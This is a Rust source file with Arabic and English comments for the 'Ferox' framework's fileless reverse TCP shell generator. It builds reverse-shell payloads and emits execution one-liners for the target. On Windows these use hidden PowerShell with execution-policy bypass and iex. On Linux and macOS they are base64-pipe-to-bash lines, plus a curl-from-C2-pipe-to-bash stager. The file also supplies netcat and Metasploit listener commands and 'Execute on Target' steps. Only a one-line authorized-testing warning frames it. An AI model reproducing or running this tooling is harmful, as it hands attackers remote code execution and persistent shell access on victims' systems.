// Ferox Fileless Reverse TCP Module
// وحدة TCP العكسي بدون ملفات - تنفيذ في الذاكرة فقط

use crate::core::payload_engine::{PayloadEngine, PayloadResult, TargetOS};
use colored::Colorize;
use std::net::IpAddr;

/// وحدة Reverse TCP بدون ملفات | Fileless Reverse TCP Module
pub struct FilelessReverseTcp {
    engine: PayloadEngine,
    name: String,
    description: String,
    author: String,
}

/// إعدادات الوحدة | Module Configuration
#[derive(Debug, Clone)]
pub struct ReverseTcpConfig {
    /// عنوان المضيف | Host address
    pub lhost: String,
    /// المنفذ | Port
    pub lport: u16,
    /// نظام التشغيل المستهدف | Target OS
    pub target_os: TargetOS,
    /// تفعيل التشفير | Enable encryption
    pub encrypt: bool,
    /// قناة C2 الاختيارية | Optional C2 channel
    pub c2_channel: Option<String>,
}

impl Default for ReverseTcpConfig {
    fn default() -> Self {
        Self {
            lhost: "0.0.0.0".to_string(),
            lport: 4444,
            target_os: TargetOS::Universal,
            encrypt: true,
            c2_channel: None,
        }
    }
}

impl FilelessReverseTcp {
    /// إنشاء وحدة جديدة | Create new module
    pub fn new() -> Result<Self, String> {
        let engine = PayloadEngine::new_random()?;

        Ok(Self {
            engine,
            name: "payloads/fileless/reverse_tcp".to_string(),
            description: "Fileless Reverse TCP Shell - Memory Only Execution".to_string(),
            author: "Ferox Team".to_string(),
        })
    }

    /// إنشاء وحدة بمفتاح مخصص | Create module with custom key
    pub fn with_key(key: &[u8]) -> Result<Self, String> {
        let engine = PayloadEngine::new(key)?;

        Ok(Self {
            engine,
            name: "payloads/fileless/reverse_tcp".to_string(),
            description: "Fileless Reverse TCP Shell - Memory Only Execution".to_string(),
            author: "Ferox Team".to_string(),
        })
    }

    /// تنفيذ الوحدة | Execute module
    pub fn execute(&self, config: ReverseTcpConfig) -> Result<ExecutionResult, String> {
        // التحقق من صحة الإعدادات | Validate configuration
        self.validate_config(&config)?;

        println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
        println!("{}", "🚀 Ferox Fileless Reverse TCP Generator".bright_green().bold());
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());

        // توليد الحمولة | Generate payload
        println!("\n{} Generating payload...", "→".bright_blue());
        let payload = self.engine.generate_reverse_tcp(
            &config.lhost,
            config.lport,
            config.target_os,
        )?;

        // عرض المعلومات | Display information
        self.display_payload_info(&payload, &config);

        // توليد Stager إذا كان هناك قناة C2 | Generate stager if C2 channel exists
        let stager = if let Some(c2_url) = &config.c2_channel {
            println!("\n{} Generating C2 stager...", "→".bright_blue());
            Some(self.engine.generate_fileless_stager(c2_url, config.target_os)?)
        } else {
            None
        };

        // توليد أوامر التنفيذ | Generate execution commands
        let execution_commands = self.generate_execution_commands(&payload, &config);

        Ok(ExecutionResult {
            payload,
            stager,
            execution_commands,
            listener_command: self.generate_listener_command(&config),
        })
    }

    /// التحقق من صحة الإعدادات | Validate configuration
    fn validate_config(&self, config: &ReverseTcpConfig) -> Result<(), String> {
        // التحقق من عنوان IP | Validate IP address
        if config.lhost.parse::<IpAddr>().is_err() && config.lhost != "localhost" {
            return Err(format!("Invalid IP address: {}", config.lhost));
        }

        // التحقق من المنفذ | Validate port
        if config.lport == 0 {
            return Err("Port cannot be 0".to_string());
        }

        Ok(())
    }

    /// عرض معلومات الحمولة | Display payload information
    fn display_payload_info(&self, payload: &PayloadResult, config: &ReverseTcpConfig) {
        println!("\n{}", "📦 Payload Information:".bright_yellow().bold());
        println!("  {} {}", "Payload ID:".bright_white(), payload.payload_id);
        println!("  {} {}", "Type:".bright_white(), payload.payload_type);
        println!("  {} {}", "Target OS:".bright_white(), payload.target_os);
        println!("  {} {} bytes", "Size:".bright_white(), payload.metadata.size_bytes);
        println!("  {} {}", "Encryption:".bright_white(), payload.metadata.encryption_method);
        println!("  {} Stage {}", "Stage:".bright_white(), payload.metadata.stage);

        println!("\n{}", "🎯 Target Configuration:".bright_yellow().bold());
        println!("  {} {}", "LHOST:".bright_white(), config.lhost);
        println!("  {} {}", "LPORT:".bright_white(), config.lport);

        if let Some(c2) = &config.c2_channel {
            println!("  {} {}", "C2 Channel:".bright_white(), c2);
        }
    }

    /// توليد أوامر التنفيذ | Generate execution commands
    fn generate_execution_commands(&self, payload: &PayloadResult, config: &ReverseTcpConfig) -> Vec<String> {
        let mut commands = Vec::new();

        match config.target_os {
            TargetOS::Windows => {
                // PowerShell Direct Execution
                commands.push(format!(
                    "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')) | iex\"",
                    &payload.base64
                ));

                // CMD Direct Execution
                commands.push(format!(
                    "cmd /c powershell -enc {}",
                    BASE64_STANDARD.encode(&payload.base64)
                ));
            }
            TargetOS::Linux => {
                // Bash Direct Execution
                commands.push(format!(
                    "echo '{}' | base64 -d | bash",
                    &payload.base64
                ));

                // Curl + Bash
                if let Some(c2) = &config.c2_channel {
                    commands.push(format!("curl -s {} | bash", c2));
                }
            }
            TargetOS::MacOS => {
                // macOS Bash Execution
                commands.push(format!(
                    "echo '{}' | base64 -D | bash",
                    &payload.base64
                ));
            }
            TargetOS::Universal => {
                // Python Universal
                commands.push(format!(
                    "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
                    &payload.base64
                ));
            }
        }

        commands
    }

    /// توليد أمر المستمع | Generate listener command
    fn generate_listener_command(&self, config: &ReverseTcpConfig) -> String {
        format!(
            "nc -lvnp {} # Or use: msfconsole -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {}; set LPORT {}; exploit'",
            config.lport, config.lhost, config.lport
        )
    }

    /// الحصول على معلومات الوحدة | Get module information
    pub fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: self.name.clone(),
            description: self.description.clone(),
            author: self.author.clone(),
            references: vec![
                "https://attack.mitre.org/techniques/T1059/".to_string(),
                "https://attack.mitre.org/techniques/T1055/".to_string(),
            ],
            supported_platforms: vec![
                TargetOS::Windows,
                TargetOS::Linux,
                TargetOS::MacOS,
                TargetOS::Universal,
            ],
        }
    }
}

/// معلومات الوحدة | Module Information
#[derive(Debug, Clone)]
pub struct ModuleInfo {
    pub name: String,
    pub description: String,
    pub author: String,
    pub references: Vec<String>,
    pub supported_platforms: Vec<TargetOS>,
}

/// نتيجة التنفيذ | Execution Result
#[derive(Debug)]
pub struct ExecutionResult {
    /// الحمولة الرئيسية | Main payload
    pub payload: PayloadResult,
    /// Stager اختياري | Optional stager
    pub stager: Option<PayloadResult>,
    /// أوامر التنفيذ | Execution commands
    pub execution_commands: Vec<String>,
    /// أمر المستمع | Listener command
    pub listener_command: String,
}

impl ExecutionResult {
    /// عرض النتائج | Display results
    pub fn display(&self) {
        println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
        println!("{}", "✅ Payload Generated Successfully".bright_green().bold());
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());

        println!("\n{}", "🎯 Step 1: Start Listener".bright_yellow().bold());
        println!("{}", self.listener_command.bright_white());

        println!("\n{}", "🚀 Step 2: Execute on Target".bright_yellow().bold());
        for (i, cmd) in self.execution_commands.iter().enumerate() {
            println!("\n{} Option {}:", "→".bright_blue(), i + 1);
            println!("{}", cmd.bright_white());
        }

        if let Some(stager) = &self.stager {
            println!("\n{}", "📡 C2 Stager Available".bright_yellow().bold());
            println!("  {} {}", "Stager ID:".bright_white(), stager.payload_id);
            println!("  {} {}", "C2 Channel:".bright_white(), 
                stager.metadata.c2_channel.as_ref().unwrap_or(&"N/A".to_string()));
        }

        println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
        println!("{}", "⚠️  WARNING: For authorized penetration testing only!".bright_red().bold());
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    }

    /// حفظ إلى ملف | Save to file
    pub fn save_to_file(&self, path: &str) -> Result<(), std::io::Error> {
        use std::fs::File;
        use std::io::Write;

        let mut file = File::create(path)?;
        
        writeln!(file, "# Ferox Payload Export")?;
        writeln!(file, "# Generated: {}", chrono::Utc::now().to_rfc3339())?;
        writeln!(file)?;
        writeln!(file, "## Payload ID: {}", self.payload.payload_id)?;
        writeln!(file, "## Type: {}", self.payload.payload_type)?;
        writeln!(file, "## Target: {}", self.payload.target_os)?;
        writeln!(file)?;
        writeln!(file, "## Encrypted Payload (Base64):")?;
        writeln!(file, "{}", self.payload.base64)?;
        writeln!(file)?;
        writeln!(file, "## Listener Command:")?;
        writeln!(file, "{}", self.listener_command)?;
        writeln!(file)?;
        writeln!(file, "## Execution Commands:")?;
        for (i, cmd) in self.execution_commands.iter().enumerate() {
            writeln!(file, "### Option {}", i + 1)?;
            writeln!(file, "{}", cmd)?;
            writeln!(file)?;
        }

        Ok(())
    }
}

use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_creation() {
        let module = FilelessReverseTcp::new().unwrap();
        let info = module.info();
        assert_eq!(info.name, "payloads/fileless/reverse_tcp");
    }

    #[test]
    fn test_payload_generation() {
        let module = FilelessReverseTcp::new().unwrap();
        let config = ReverseTcpConfig {
            lhost: "192.168.1.100".to_string(),
            lport: 4444,
            target_os: TargetOS::Linux,
            encrypt: true,
            c2_channel: None,
        };

        let result = module.execute(config).unwrap();
        assert!(!result.payload.base64.is_empty());
        assert!(!result.execution_commands.is_empty());
    }

    #[test]
    fn test_config_validation() {
        let module = FilelessReverseTcp::new().unwrap();
        
        // Invalid IP
        let invalid_config = ReverseTcpConfig {
            lhost: "invalid_ip".to_string(),
            lport: 4444,
            target_os: TargetOS::Windows,
            encrypt: true,
            c2_channel: None,
        };
        assert!(module.validate_config(&invalid_config).is_err());

        // Invalid port
        let invalid_port = ReverseTcpConfig {
            lhost: "192.168.1.1".to_string(),
            lport: 0,
            target_os: TargetOS::Windows,
            encrypt: true,
            c2_channel: None,
        };
        assert!(module.validate_config(&invalid_port).is_err());
    }
}
